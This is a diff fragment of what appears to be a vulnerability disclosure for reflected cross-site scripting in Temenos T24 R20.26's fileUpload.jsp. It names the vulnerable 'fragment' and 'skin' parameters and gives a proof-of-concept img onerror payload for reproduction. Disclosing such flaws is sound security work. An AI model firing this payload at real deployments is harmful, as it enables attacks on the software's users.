@@ -3,7 +3,7 @@ In Temenos T24 R20.26, I found Reflected-XSS in BrowserWeb/jsps/fileUpload.jsp.<
 Affected Version: T24-R20.26.<br>
 Parameter Affected: fragment, skin
 ## Reproduce bug:
-Send request to https://{url}/BrowserWeb/jsps/fileUpload.jsp with payload xss in 'fragment' parameter
+Send request to https://{url}/BrowserWeb/jsps/fileUpload.jsp with payload xss in 'fragment' parameter<br>
 Payload : ```"><img src=1 onerror=alert(1337)>```
 ![Alt text](Request.png)
 Payload trigger in browser:
